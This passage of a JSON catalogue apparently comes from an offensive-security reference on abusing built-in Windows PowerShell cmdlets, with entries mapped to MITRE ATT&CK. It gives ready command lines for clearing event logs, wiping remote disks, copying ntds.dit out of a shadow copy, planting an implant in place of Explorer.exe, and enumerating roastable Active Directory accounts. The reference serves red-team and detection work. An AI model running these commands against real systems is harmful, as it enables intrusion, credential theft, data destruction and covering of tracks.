"comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nSee all details in [New-NetEventSession](../New-NetEventSession)\nCan be opened using for example NetworkMiner or Wireshark\nPowerShell Module: `NetEventPacketCapture`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-11-04"}, {"id": 147, "name": "Add-NetNatExternalAddress", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Adds an external address to a NAT instance", "description": "TODO", "commandline": "Add-NetNatExternalAddress -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetNat`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 148, "name": "Add-NetNatStaticMapping", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Adds a static mapping to a NAT instance", "description": "TODO", "commandline": "Add-NetNatStaticMapping -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetNat`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 149, "name": "Backup-GPO", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Backs up one GPO or all the GPOs in a domain", "description": "Backup all GPOs of the domain", "commandline": "Backup-Gpo -Domain ad.bitsadmin.com -All -Path C:\\tmp\\GPOBackups", "usecases": ["Collect GPOs and search for credentials"], "comments": "PowerShell Module: `GroupPolicy`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 150, "name": "Clear-Disk", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Cleans a disk by removing all partition information and un-initializing it, erasing all data on the disk", "description": "Clear disk with id 3", "commandline": "Clear-Disk -CimSession $s -Number 3", "usecases": ["Affect availability of data on a disk"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Storage`", "resources": [], "mitre_techniques": ["T1561", "T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 151, "name": "Clear-DnsClientCache", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Clears the contents of the DNS client cache", "description": "Clear DNS cache", "commandline": "Clear-DnsClientCache -CimSession $s", "usecases": ["Clear the DNS cache from any DNS entries that the attacker might have (accidentally) placed there"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DnsClient`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 152, "name": "Clear-Eventlog", "type": "Cmdlets", "function": "Logs", "toolsets": ["Builtin"], "synopsis": "Clears all entries from specified event logs on the local or remote computers.", "description": "Clear various logs on various computers", "commandline": "Clear-EventLog -LogName Application,Security,System -ComputerName W10.ad.bitsadmin.com,W11.ad.bitsadmin.com", "usecases": ["Cover tracks clearing past events in the various logs"], "comments": "Be aware that this leaves an event stating that the Security event log has been cleared (event id 1102)\nSee also [wevtutil.exe](../../Binaries/wevtutil)", "resources": [], "mitre_techniques": ["T1070.001"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 153, "name": "Close-SmbOpenFile", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Closes a file that is open by one of the clients of the SMB server", "description": "TODO", "commandline": "Close-SmbOpenFile -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `SmbShare`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 154, "name": "Close-SmbSession", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Ends forcibly the SMB session", "description": "TODO", "commandline": "Close-SmbSession -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `SmbShare`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 155, "name": "Connect-WSMan", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "TODO"], "synopsis": "Connects to the WinRM service on a remote computer", "description": "TODO", "commandline": "Connect-WSMan", "usecases": [], "comments": "PowerShell Module: `Microsoft.WSMan.Management`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 156, "name": "Copy-Item", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "PSSession"], "synopsis": "Copies an item from one location to another", "description": "Copy file from PSSession", "commandline": "Copy-Item -Path C:\\boot.ini -Destination . -FromSession $ps", "usecases": ["Exfiltrate data"], "comments": "Create PSSession `$ps` using [New-PSSession](../New-PSSession/)\nPowerShell Module: `Microsoft.PowerShell.Management`", "resources": ["https://blog.bitsadmin.com/extracting-credentials-from-remote-windows-system"], "mitre_techniques": ["T1021.006"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 157, "name": "Copy-Item", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "PSSession"], "synopsis": "Copies an item from one location to another", "description": "Copy file to PSSession", "commandline": "Copy-Item -Path C:\\beacon.exe -Destination C:\\Windows\\System32\\Explorer.exe -ToSession $ps", "usecases": ["Copy implant"], "comments": "Create PSSession `$ps` using [New-PSSession](../New-PSSession/)\nPowerShell Module: `Microsoft.PowerShell.Management`", "resources": ["https://blog.bitsadmin.com/extracting-credentials-from-remote-windows-system"], "mitre_techniques": ["T1021.006", "T1570"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 158, "name": "Copy-Item", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "PSSession"], "synopsis": "Copies an item from one location to another", "description": "Copy from volume shadow copy", "commandline": "Copy-Item -Path \\\\DC01.ad.bitsadmin.com\\C$\\@GMT-2023.06.01-19.34.01\\Windows\\NTDS\\ntds.dit -Destination C:\\Tmp\\", "usecases": ["Exfiltrate `ntds.dit` from shadow copy over SMB"], "comments": "Create PSSession `$ps` using [New-PSSession](../New-PSSession/)\nExample of performing such copy at the blog in the references\nPowerShell Module: `Microsoft.PowerShell.Management`", "resources": ["https://blog.bitsadmin.com/extracting-credentials-from-remote-windows-system"], "mitre_techniques": ["T1570", "T1021.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 159, "name": "Copy-VMFile", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Copies a file to a virtual machine", "description": "Copy file to VM", "commandline": "Copy-VMFile -SourcePath C:\\tmp\\malware.exe -Name 'Windows 10 22H2' -DestinationPath C:\\Windows\\System32\\spoolsv64.exe -FileSource Host -CimSession $s", "usecases": ["Copy implant to VM"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\n`C:\\tmp\\malware.exe` is a file path on the Hyper-V host to which the `-CimSession $s` points\n`malware.exe` can be copied to the Hyper-V host using [Copy-Item](../Copy-Item)\nDepends on some guest integration services to be enabled for the VM\nPowerShell Module: `Hyper-V`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 160, "name": "Disable-ADAccount", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Disables an Active Directory account", "description": "Disable account", "commandline": "Disable-ADAccount -Identity Hacker", "usecases": [], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": ["T1531"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 161, "name": "Disable-NetAdapter", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Disables a network adapter", "description": "Disable network adapter", "commandline": "Disable-NetAdapter -Name Ethernet0 -CimSession $s", "usecases": ["Put remote machine offline"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetAdapter`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 162, "name": "Disable-NetFirewallRule", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Disables a firewall rule", "description": "TODO", "commandline": "Disable-NetFirewallRule -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `netsecurity`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 163, "name": "Dismount-DiskImage", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Dismounts a disk image (virtual hard disk or ISO) so that it can no longer be accessed as a disk", "description": "TODO", "commandline": "Dismount-DiskImage -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Storage`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 164, "name": "Enable-ADAccount", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Enables an Active Directory account", "description": "Enable account", "commandline": "Enable-ADAccount", "usecases": ["(Re-)enable account to make use of it"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 165, "name": "Enable-NetFirewallRule", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Enables a previously disabled firewall rule", "description": "TODO", "commandline": "Enable-NetFirewallRule -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `netsecurity`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 166, "name": "Enter-PSSession", "type": "Cmdlets", "function": "Execute", "toolsets": ["Builtin", "PSSession"], "synopsis": "Starts an interactive session with a remote computer", "description": "Start interactive session", "commandline": "Enter-PSSession -Session $ps", "usecases": ["Launch shell and perform reconnaissance or install a backdoor"], "comments": "Create `$ps` using [New-PSSession](../New-PSSession)", "resources": [], "mitre_techniques": ["T1021.006"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 167, "name": "Enter-PSSession", "type": "Cmdlets", "function": "Execute", "toolsets": ["Builtin", "PSSession"], "synopsis": "Starts an interactive session with a remote computer", "description": "Start interactive session", "commandline": "Enter-PSSession -ComputerName W10.ad.bitsadmin.com", "usecases": ["Launch shell and perform reconnaissance or install a backdoor"], "comments": "", "resources": [], "mitre_techniques": ["T1021.006"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 168, "name": "Export-VM", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Exports a virtual machine to disk", "description": "Export VM", "commandline": "Export-VM -Name 'Windows 10 22H2' -Path C:\\tmp -CimSession $s", "usecases": ["Export a (running) VM and copy its data over the network"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nCan also be a running VM\nNext, using [Copy-Item](../Copy-Item) the exported VM can be copied\nPowerShell Module: `Hyper-V`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 169, "name": "Export-VMSnapshot", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Exports a virtual machine checkpoint to disk", "description": "Create snapshot of VM", "commandline": "Export-VMSnapshot -Name 'VM snapshot' -VMName 'Windows 10 22H2' -Path C:\\tmp -CimSession $s", "usecases": ["Create a snapshot to then exfiltrate it over the network"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNext, using [Copy-Item](../Copy-Item) the snapshot can be copied locally\nPowerShell Module: `Hyper-V`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 170, "name": "Find-NetRoute", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Finds the best local IP address and the best route to reach a remote address", "description": "TODO", "commandline": "Find-NetRoute -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetTCPIP`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 171, "name": "Format-Volume", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Formats one or more existing volumes or a new volume on an existing partition", "description": "Format volume", "commandline": "Format-Volume -CimSession $s -DriveLetter D -Force", "usecases": ["Affect availability of data on a volume"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Storage`", "resources": [], "mitre_techniques": ["T1485", "T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 172, "name": "Get-ADComputer", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Gets one or more Active Directory computers", "description": "Query computers from specific OU", "commandline": "Get-ADComputer -SearchBase \"OU=Domain Controllers,DC=ad,DC=bitsadmin,DC=com\" -Filter *", "usecases": ["Query list of domain controllers"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 173, "name": "Get-ADComputer", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Gets one or more Active Directory computers", "description": "Query computers with specific attribute", "commandline": "Get-ADComputer -Filter 'OperatingSystem -like \"*Server 2008*\"' -Properties OperatingSystem", "usecases": ["Identify computers running an unsupported operating system"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 174, "name": "Get-ADComputerServiceAccount", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Gets the service accounts hosted by a computer", "description": "TODO", "commandline": "Get-ADComputerServiceAccount", "usecases": [], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 175, "name": "Get-ADDomain", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Gets an Active Directory domain", "description": "Get domain", "commandline": "Get-ADDomain ad.bitsadmin.com", "usecases": ["Get information about the domain"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 176, "name": "Get-ADDomainController", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Gets one or more Active Directory domain controllers based on discoverable services criteria, search parameters or by providing a domain controller identifier, such as the NetBIOS name", "description": "List all domain controllers", "commandline": "Get-ADDomainController -Filter * -Server ad.bitsadmin.com", "usecases": ["Enumerate all domain controllers of a domain"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 177, "name": "Get-ADDomainController", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Gets one or more Active Directory domain controllers based on discoverable services criteria, search parameters or by providing a domain controller identifier, such as the NetBIOS name", "description": "List domain controllers", "commandline": "Get-ADDomainController -Discover -Service GlobalCatalog -DomainName ad.bitsadmin.com", "usecases": ["Obtain hostname and IP of a GC domain controller"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 178, "name": "Get-ADForest", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Gets an Active Directory forest", "description": "Get forest", "commandline": "Get-ADForest -Server ad.bitsadmin.com", "usecases": ["Enumerate information about forest"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 179, "name": "Get-ADGroup", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Gets one or more Active Directory groups", "description": "List all groups", "commandline": "Get-ADGroup -Filter * -Server ad.bitsadmin.com", "usecases": ["Enumerate groups"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 180, "name": "Get-ADGroupMember", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Gets the members of an Active Directory group", "description": "List all members of a group", "commandline": "Get-ADGroupMember \"Domain Admins\" -Recursive -Server ad.bitsadmin.com", "usecases": ["Understand interesting targets in the environment"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 181, "name": "Get-ADObject", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Gets one or more Active Directory objects", "description": "Query AD Objects using filter", "commandline": "Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo, userAccountControl", "usecases": ["Enumerate users and computers with constrained delegation enabled"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 182, "name": "Get-ADOrganizationalUnit", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Gets one or more Active Directory organizational units", "description": "Obtain information about OU", "commandline": "Get-ADOrganizationalUnit 'OU=Domain Controllers,DC=ad,DC=bitsadmin,DC=com'", "usecases": ["Learn which policies are applied to an OU"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 183, "name": "Get-ADReplicationSubnet", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Returns a specific Active Directory subnet or a set of AD subnets based on a specified filter.", "description": "List replication subnets", "commandline": "Get-ADReplicationSubnet -Filter * -Server ad.bitsadmin.com | select Name,Location,Site", "usecases": ["Enumerate subnets in use in the domain; useful to add LOFL tun2socks routes"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 184, "name": "Get-ADTrust", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Returns all trusted domain objects in the directory", "description": "Query AD trusts", "commandline": "Get-ADTrust -Filter * -Server ad.bitsadmin.com | ft Direction,Name,TrustType", "usecases": ["Understand trust relations of the forest and domains"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 185, "name": "Get-ADUser", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Gets one or more Active Directory users", "description": "List users based on filter", "commandline": "Get-ADUser -Filter {DoesNotRequirePreauth -eq $true}", "usecases": ["Enumerate aseproastable users"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 186, "name": "Get-ADUser", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Gets one or more Active Directory users", "description": "List users based on filter", "commandline": "Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName", "usecases": ["Enumerate kerberoastable users"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 187, "name": "Get-ADUser", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Gets one or more Active Directory users", "description": "List users based on filter", "commandline": "Get-ADUser -Filter {TrustedForDelegation -eq $true}", "usecases": ["Enumerate accounts that are trusted for unconstrained delegation"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 188, "name": "Get-ADUser", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Gets one or more Active Directory users", "description": "List users based on LDAP filter", "commandline": "Get-ADUser -LDAPFilter \"(adminCount=1)\" -Server ad.bitsadmin.com", "usecases": ["Enumerate users which [have been/are] members of at least one Administrative group"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 189, "name": "Get-AppvVirtualProcess", "type": "Cmdlets", "function": "Manage", "toolsets": ["RSAT", "TODO"], "synopsis": "Displays the virtual processes running on a computer", "description": "TODO", "commandline": "Get-AppvVirtualProcess", "usecases": [], "comments": "PowerShell Module: `AppvClient`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 190, "name": "Get-ChildItem", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin"], "synopsis": "Gets the files and folders in a file system drive.", "description": "Enumerate network share", "commandline": "Get-ChildItem -LiteralPath '\\\\?\\UNC\\FS1.ad.bitsadmin.com\\IT' -Depth 25 -Force | ForEach-Object { [PSCustomObject]@{Name=$_.Name; Mode=$_.Mode; Length=$_.Length; LastWriteTime=$_.LastWriteTime.ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss'); FullName=$_.FullName.Replace('\\?\\UNC','') } } | Export-Csv -Encoding UTF8 -NoTypeInformation FS1_IT.csv", "usecases": ["Create file listing of network share to identify files that can be used for escalation"], "comments": "PowerShell Module: `Microsoft.PowerShell.Management`", "resources": ["https://blog.bitsadmin.com/digging-for-secrets"], "mitre_techniques": ["T1083"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 191, "name": "Get-CimAssociatedInstance", "type": "Cmdlets", "function": "Misc", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Retrieves the CIM instances that are connected to a specific CIM instance by an association", "description": "TODO", "commandline": "Get-CimAssociatedInstance -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `CimCmdlets`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 192, "name": "Get-CimClass", "type": "Cmdlets", "function": "Misc", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Gets a list of CIM classes in a specific namespace", "description": "TODO", "commandline": "Get-CimClass -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `CimCmdlets`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 193, "name": "Get-CimInstance", "type": "Cmdlets", "function": "Processes", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets the CIM instances of a class from a CIM server", "description": "Get instances of a CIM class", "commandline": "Get-CimInstance -CimSession $s -ClassName Win32_Process", "usecases": ["List running processes"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `CimCmdlets`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 194, "name": "Get-CimInstance", "type": "Cmdlets", "function": "Processes", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets the CIM instances of a class from a CIM server", "description": "Get instances of a CIM class", "commandline": "Get-CimInstance -ClassName Win32_Process | % { [PSCustomObject]@{Name=$_.Name; User=$(Invoke-CimMethod -InputObject $_ -MethodName GetOwner).User } }", "usecases": ["List running processes including username"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `CimCmdlets`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 195, "name": "Get-CimInstance", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets the CIM instances of a class from a CIM server", "description": "Get instances of a CIM class", "commandline": "Get-CimInstance -Filter 'Name=\"TermService\"' -ClassName Win32_Service -CimSession $s", "usecases": ["Obtain the \"Remote Desktop Services\" service instance. This can now for example be used to launch or stop the service"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `CimCmdlets`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 196, "name": "Get-DfsnFolder", "type": "Cmdlets", "function": "Data", "toolsets": ["CIMSession", "TODO"], "synopsis": "Gets settings for a DFS namespace folder", "description": "TODO", "commandline": "Get-DfsnFolder -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DFSN`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 197, "name": "Get-DfsnFolderTarget", "type": "Cmdlets", "function": "Data", "toolsets": ["CIMSession", "TODO"], "synopsis": "Gets settings for targets of a DFS namespace folder", "description": "TODO", "commandline": "Get-DfsnFolderTarget -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DFSN`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 198, "name": "Get-DfsnRoot", "type": "Cmdlets", "function": "Data", "toolsets": ["CIMSession", "TODO"], "synopsis": "Gets settings for DFS namespaces", "description": "TODO", "commandline": "Get-DfsnRoot -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DFSN`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 199, "name": "Get-DfsnRootTarget", "type": "Cmdlets", "function": "Data", "toolsets": ["CIMSession", "TODO"], "synopsis": "Gets settings for root targets of a DFS namespace", "description": "TODO", "commandline": "Get-DfsnRootTarget -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DFSN`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 200, "name": "Get-DhcpServerAuditLog", "type": "Cmdlets", "function": "Manage", "toolsets": ["CIMSession", "TODO"], "synopsis": "Gets the configuration parameters related to the audit log of the Dynamic Host Configuration Protocol (DHCP) server service", "description": "TODO", "commandline": "Get-DhcpServerAuditLog -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DhcpServer`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 201, "name": "Get-DhcpServerDatabase", "type": "Cmdlets", "function": "Manage", "toolsets": ["CIMSession", "TODO"], "synopsis": "Gets the configuration parameters related to the database of the Dynamic Host Configuration Protocol (DHCP) server service", "description": "TODO", "commandline": "Get-DhcpServerDatabase -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DhcpServer`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 202, "name": "Get-DhcpServerDnsCredential", "type": "Cmdlets", "function": "Manage", 